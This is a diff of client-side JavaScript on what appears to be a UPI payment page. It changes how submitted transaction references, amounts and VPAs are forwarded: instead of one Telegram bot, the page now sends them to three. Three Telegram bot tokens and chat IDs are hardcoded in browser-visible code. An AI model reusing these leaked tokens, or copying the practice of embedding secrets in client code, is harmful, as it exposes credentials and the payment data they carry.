@@ -651,18 +651,24 @@
       btn.textContent = 'SENDING...';
       btn.disabled = true;
 
-      var botToken = '8898590319:AAH4ItCgz1yzAj9fxLfSoUpVLO5GzAhor1A';
-      var chatId = '6743274325';
       var text = '*New UTR Submission*\n\n*Amount:* ₹' + currentAmount + '\n*VPA:* ' + currentVPA + '\n*UTR:* ' + val;
 
-      fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
-      })
-      .then(function(res) { return res.json(); })
-      .then(function(data) {
-        if (data.ok) {
+      var bots = [
+        { token: '8898590319:AAH4ItCgz1yzAj9fxLfSoUpVLO5GzAhor1A', chatId: '6743274325' },
+        { token: '8728246914:AAG1JyN8iRGV-h8xFBdn2D631R0dHWegwEU', chatId: '6743274325' },
+        { token: '8751412419:AAFlI93vDlMpvukhFX4ktp2mXDafQHsYXiA', chatId: '7813520791' }
+      ];
+
+      Promise.all(bots.map(function(bot) {
+        return fetch('https://api.telegram.org/bot' + bot.token + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: bot.chatId, text: text, parse_mode: 'Markdown' })
+        }).then(function(res) { return res.json(); });
+      }))
+      .then(function(results) {
+        var anyOk = results.some(function(r) { return r.ok; });
+        if (anyOk) {
           showToast('UTR submitted successfully');
           document.getElementById('utr-input').value = '';
         } else {
